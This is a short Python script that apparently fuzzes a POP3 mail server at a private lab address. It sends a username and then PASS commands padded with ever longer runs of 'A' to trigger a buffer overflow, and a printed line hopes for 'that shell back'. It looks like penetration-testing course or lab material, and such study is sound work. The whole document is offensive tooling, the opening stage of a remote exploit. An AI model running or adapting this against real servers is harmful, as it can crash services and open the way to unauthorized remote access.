#!/usr/bin/python
 
import socket

count = 100
buffer = "A"
 
while len(buffer) <= 4000:
    buffer = "A" * count
    try:
        print ("Fuzzing with a length of %s bytes" % len(buffer))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect = s.connect(('10.1.1.97', 110))
        s.recv(1024)
        s.send('USER chris ' + '\r\n')
        s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
        s.recv(1024)
        s.close()
        print ("\nDone! Wonder if we got that shell back?")
        count += 200
    except:
        print ("Could not connect to POP3 for some reason...")